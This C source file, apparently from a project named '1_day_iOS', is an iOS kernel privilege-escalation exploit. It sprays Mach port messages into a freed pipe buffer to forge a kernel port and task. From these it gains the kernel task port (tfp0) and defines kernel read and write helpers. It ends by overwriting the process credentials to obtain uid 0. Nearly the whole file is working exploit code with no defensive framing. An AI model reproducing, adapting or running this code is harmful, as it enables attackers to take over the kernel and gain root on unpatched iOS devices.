//
//  exploit.c
//  1_day_iOS
//
//  Created by System on 01/12/2020.
//  Copyright Â© 2020 System. All rights reserved.
//

#include "exploit.h"
#include "read.h"
#include "get_port.h"
#include <pthread.h>
#include "spray.h"
#include "kernel_alloc.h"
#include <mach/mach.h>
#import <sys/mman.h>

mach_port_t tfp0;
uint64_t FAKE_TASK_PIPE_MAGIC = 0x1133557799bbddff;

size_t kBuffersize = 16384;
uint64_t port;
uint64_t kernel_vm_map_;
uint64_t kernel_ipc_space_;
uint64_t myproc_ucred;
uint64_t my_proc;
uint64_t my_task;
uint64_t proc_fd;
int make_tfp0(uint64_t task_port,uint64_t fd_ofiles){
    port = task_port;
   // get_ucred_addr();
    sleep(3);
    //get_kernel_map(&kernel_vm_map_,fd_ofiles);
    sleep(3);
    get_ipc_space(&kernel_ipc_space_);
    sleep(3);
    // TRY 3
    int fds[2] = {-1, -1};
    int ret = pipe(fds);
    if (ret) {
        printf("[-] failed to create pipe fds\n");
    }
    uint8_t buf[0x600];
    memset(buf, 0, 0x600);
    write(fds[1], buf, 0x600);
    read(fds[0], buf, 0x600);
    
    uint64_t fileproc;
    uint64_t fileglob;
    uint64_t fgdata;
    uint64_t pipe_buffer = 0;
    if(!Read_data_64(fd_ofiles + fds[0] * 8 , &fileproc)){
        printf("ERROR!! failed on reading fileproc address\n");
        return 0;
    }
    printf("fileproc addr : 0x%llx\n",fileproc);
    
    if(!Read_data_64(fileproc + offset_fileproc_fileglob, &fileglob)){
        printf("ERROR!! failed on reading fileglob address\n");
        return 0;
    }
    
    printf("fileglob addr : 0x%llx\n",fileglob);
    if(!Read_data_64(fileglob + offset_fileglob_fgdata, &fgdata)){  // always error in here why?
        printf("ERROR!! failed on reading fgdata address\n");
        return 0;
    }
    printf("fgdata addr : 0x%llx\n",fgdata);
    if(!Read_data_64(fgdata + offset_pipe_pipebuffer,&pipe_buffer)){
        printf("ERROR!! failed on reading pipe_buffer address\n");
        return 0;
    }
    printf("pipe buffer addr : 0x%llx\n",pipe_buffer);
    printf("!");
    
    uint32_t MAX_KERNEL_TRAILER_SIZE = 0x44;
    uint32_t replacer_body_size = (uint32_t)(message_size_for_kalloc_size(4096) - sizeof(mach_msg_header_t));
    uint32_t message_body_offset = 0x1000 - replacer_body_size - MAX_KERNEL_TRAILER_SIZE;
    
    int n_pre_ports = 100000;
    mach_port_t *pre_ports = malloc(n_pre_ports * sizeof(mach_port_t));
    for (int i = 0; i < n_pre_ports; i++) {
        pre_ports[i] = new_port();
    }
    uint32_t smaller_body_size = (uint32_t)(message_size_for_kalloc_size(1024) - sizeof(mach_msg_header_t));
    
    uint8_t* smaller_body = malloc(smaller_body_size);
    memset(smaller_body, 'C', smaller_body_size);
    
    const int n_smaller_ports = 600;
    mach_port_t smaller_ports[n_smaller_ports];
    for (int i = 0; i < n_smaller_ports; i++) {
        smaller_ports[i] = send_kalloc_message(smaller_body, smaller_body_size);
    }
    
    free(smaller_body);
    
    sleep(2);
    int ports_to_test = 100;
    int base = n_pre_ports - 96;
    mach_port_t first_port = MACH_PORT_NULL;
    uint64_t first_port_address = 0;
    for (int i = 0; i < ports_to_test; i++) {
        mach_port_t candidate_port = pre_ports[base+i];
        uint64_t candidate_address;
        get_port_addr(candidate_port, &candidate_address);
        uint64_t page_offset = candidate_address & 0xfff;
        if (page_offset > 0xa00 && page_offset < 0xe80) { // when using mach messages there are some limits as opposed to IOSurface
            printf("[+] found target port with suitable allocation page offset: 0x%016llx\n", candidate_address);
            pre_ports[base+i] = MACH_PORT_NULL;
            first_port = candidate_port;
            first_port_address = candidate_address;
            break;
        }
    }
    sleep(2);
    if (first_port == MACH_PORT_NULL) {
        
        printf("[-] unable to find a candidate port with a suitable page offset\n");
        
    }
    Free_pipe(first_port_address);
     sleep(2);
     mach_port_insert_right(mach_task_self(), first_port, first_port, MACH_MSG_TYPE_MAKE_SEND);
    for (int i = 0; i < n_pre_ports; i++) {
        if (pre_ports[i]) {
            mach_port_destroy(mach_task_self(), pre_ports[i]);
        }
    }
     sleep(2);
    for (int i = 0; i < n_smaller_ports; i++) {
        mach_port_destroy(mach_task_self(), smaller_ports[i]);
    }
    uint8_t* body = malloc(replacer_body_size);
    memset(body, 0, replacer_body_size);
    uint32_t port_page_offset = first_port_address & 0xfff;
    sleep(2);
    kport_t *fakeport = (kport_t *)(body + (port_page_offset - message_body_offset));
    ktask_t *fake_task = malloc(0x600);
    bzero((void *)fake_task, 0x600);
    fake_task->ref_count = 0xff;
    
    fakeport->ip_bits = 0x80000002;
    fakeport->ip_references = 0x1000; // 0xd00d
    fakeport->ip_lock.type = 0x11;
    fakeport->ip_messages.port.receiver_name = 1;
    fakeport->ip_messages.port.msgcount = 1; // 0
    fakeport->ip_messages.port.qlimit = 1024;
    fakeport->ip_messages.port.waitq.flags = mach_port_waitq_flags();
    fakeport->ip_srights = 99;
    
    fakeport->ip_kobject = pipe_buffer;
    write(fds[1], fake_task, 0x600);
    fakeport->ip_receiver = kernel_ipc_space_;
    
    const int replacer_ports_limit = 200; // original : 200
    mach_port_t replacer_ports[replacer_ports_limit];
    
    memset(replacer_ports, 0, sizeof(replacer_ports));
    uint32_t i;
    for (i = 0; i < replacer_ports_limit; i++) {
        replacer_ports[i] = send_kalloc_message(body, replacer_body_size);
        pthread_yield_np();
        usleep(10000);
    }

    free(pre_ports);
    
     uint64_t *read_addr_ptr = (uint64_t *)((uint64_t)fake_task + offset_task_bsd_info);

#define kr32(addr, value)\
read(fds[0], fake_task, 0x600);\
*read_addr_ptr = addr -  offset_proc_pid;\
write(fds[1], fake_task, 0x600);\
value = 0x0;\
ret = pid_for_task(first_port, (int *)&value);

uint32_t read64_tmp;
#define kr64(addr, value)\
kr32(addr + 0x4, read64_tmp);\
kr32(addr, value);\
value = value | ((uint64_t)read64_tmp << 32)
    
    // -------------- PLS WORK --------------
    
    uint64_t struct_task;
    kr64(task_port + offset_ipc_port_ip_kobject, struct_task);
    if (!struct_task) {
        printf("[-] kernel read failed!\n");
    }
    if(struct_task == 0xffffffffffffffff)
    {
        printf("[-] something is wrong!\n");
    }
    
    printf("[!] READING VIA FAKE PORT WORKED? 0x%llx\n", struct_task);
    printf("[+] Let's steal that kernel task port!\n");
    
    while (struct_task != 0) {
        uint64_t bsd_info;
        kr64(struct_task + offset_task_bsd_info, bsd_info);
        if (!bsd_info) {
            printf("[-] kernel read failed!\n");
            
        }
        
        uint32_t pid;
        kr32(bsd_info + offset_proc_pid, pid);
        
        if (pid == 0) {
            uint64_t vm_map;
            kr64(struct_task +offset_task_map, vm_map);
            if (!vm_map) {
                printf("[-] kernel read failed!\n");
         
            }
            
            kernel_vm_map_ = vm_map;
            break;
        }
        
        kr64(struct_task +0x30, struct_task);
    }
    
    printf("[-] kernel_vm_map: 0x%llx\n", kernel_vm_map_);
    tfp0 = first_port;
    read(fds[0], fake_task, 0x600);
    fake_task->lock.data = 0x0;
    fake_task->lock.type = 0x22;
    fake_task->ref_count = 0x1000;
    fake_task->active = 1;
    fake_task->map = kernel_vm_map_;
    *(uint32_t *)((uint64_t)fake_task + 0xd8) = 1;
    
    write(fds[1], fake_task, 0x600);
    
    printf("now uid : %d\n",getuid());
    
   
    uint64_t task;
    uint64_t proc;
    task = rk64(port + offset_ipc_port_ip_kobject);
    proc = rk64(task + offset_task_bsd_info);
    myproc_ucred = rk64(proc + offset_proc_ucred);
    
    int a = rk32(myproc_ucred + 24);
    printf("id : %d\n",a);
    wk64(myproc_ucred + 24,0);
    printf("i changed kernel_ucred data!!\n");
    printf("now uid : %d\n",getuid());
    printf("finished\n");
     
    return 0;
}

int get_ipc_space(uint64_t * ipc_space){
    
    uint64_t host_port;
    if(!get_port_addr(mach_host_self() , &host_port)){
        printf("failed on get host port\n");
        return 0;
    }
    printf("host port : 0x%llx\n",host_port);
    if(!Read_data_64(host_port + offset_ipcport_ipreceiver, ipc_space)){
        printf("failed on get ipc space\n");
        return 0;
    }
    kernel_ipc_space_ = *ipc_space;
    
    return 1;
}
int Free_pipe(uint64_t addr){
    if(!Read_data(addr,0,1)){
        printf("failed on free pipe buffer\n");
        return 0;
    }
    return 1;
}



mach_port_t new_port() {
    mach_port_t port;
    kern_return_t rv = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (rv) {
        printf("[-] Failed to allocate port (%s)\n", mach_error_string(rv));
        return MACH_PORT_NULL;
    }
    rv = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (rv) {
        printf("[-] Failed to insert right (%s)\n", mach_error_string(rv));
        return MACH_PORT_NULL;
    }
    return port;
}

mach_port_t send_kalloc_message(uint8_t *replacer_message_body, uint32_t replacer_body_size) {
    mach_port_t q = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
    if (err != KERN_SUCCESS) {
        printf("[-] failed to allocate port\n");
        return MACH_PORT_NULL;
    }
    
    mach_port_limits_t limits = {0};
    limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
    err = mach_port_set_attributes(mach_task_self(),
                                   q,
                                   MACH_PORT_LIMITS_INFO,
                                   (mach_port_info_t)&limits,
                                   MACH_PORT_LIMITS_INFO_COUNT);
    if (err != KERN_SUCCESS) {
        printf("[-] failed to increase queue limit\n");
        return MACH_PORT_NULL;
    }
    
    mach_msg_size_t msg_size = sizeof(struct simple_msg) + replacer_body_size;
    struct simple_msg *msg = (struct simple_msg *)malloc(msg_size);
    memset(msg, 0, sizeof(struct simple_msg));
    
    memcpy(&msg->buf[0], replacer_message_body, replacer_body_size);
    
    for (int i = 0; i < 256; i++) {
        msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
        msg->hdr.msgh_size = msg_size;
        msg->hdr.msgh_remote_port = q;
        msg->hdr.msgh_local_port = MACH_PORT_NULL;
        msg->hdr.msgh_id = 0x41414142;
        
        err = mach_msg(&msg->hdr,
                       MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                       msg_size,
                       0,
                       MACH_PORT_NULL,
                       MACH_MSG_TIMEOUT_NONE,
                       MACH_PORT_NULL);
        
        if (err != KERN_SUCCESS) {
            printf("[-] failed to send message %x (%d): %s\n", err, i, mach_error_string(err));
            return MACH_PORT_NULL;
        }
    }
    
    return q;
}

uint32_t mach_port_waitq_flags() {
    union waitq_flags waitq_flags = {};
    waitq_flags.waitq_type              = 2;
    waitq_flags.waitq_fifo              = 1;
    waitq_flags.waitq_prepost           = 0;
    waitq_flags.waitq_irq               = 0;
    waitq_flags.waitq_isvalid           = 1;
    waitq_flags.waitq_turnstile_or_port = 1;
    return waitq_flags.flags;
}

void kfree(mach_vm_address_t address, vm_size_t size) {
    mach_vm_deallocate(tfp0, address, size);
}
uint64_t kalloc(vm_size_t size) {
    mach_vm_address_t address = 0;
    mach_vm_allocate(tfp0, (mach_vm_address_t *)&address, size, VM_FLAGS_ANYWHERE);
    return address;
}

size_t kwrite(uint64_t where, const void *p, size_t size) {
    int rv;
    size_t offset = 0;
    while (offset < size) {
        size_t chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_write(tfp0, where + offset, (mach_vm_offset_t)p + offset, (int)chunk);
        if (rv) {
            printf("[-] error on kwrite(0x%016llx)\n", where);
            break;
        }
        offset += chunk;
    }
    return offset;
}

size_t kread(uint64_t where, void *p, size_t size) {
    int rv;
    size_t offset = 0;
    while (offset < size) {
        mach_vm_size_t sz, chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_read_overwrite(tfp0, where + offset, chunk, (mach_vm_address_t)p + offset, &sz);
        if (rv || sz == 0) {
            printf("[-] error on kread(0x%016llx)\n", where);
            break;
        }
        offset += sz;
    }
    return offset;
}


void wk64(uint64_t where, uint64_t what) {
    uint64_t _what = what;
    kwrite(where, &_what, sizeof(uint64_t));
}

void wk32(uint64_t where, uint32_t what) {
    uint32_t _what = what;
    kwrite(where, &_what, sizeof(uint32_t));
}

uint32_t rk32(uint64_t where) {
    uint32_t out;
    kread(where, &out, sizeof(uint32_t));
    return out;
}

uint64_t rk64(uint64_t where) {
    uint64_t out;
    kread(where, &out, sizeof(uint64_t));
    return out;
}

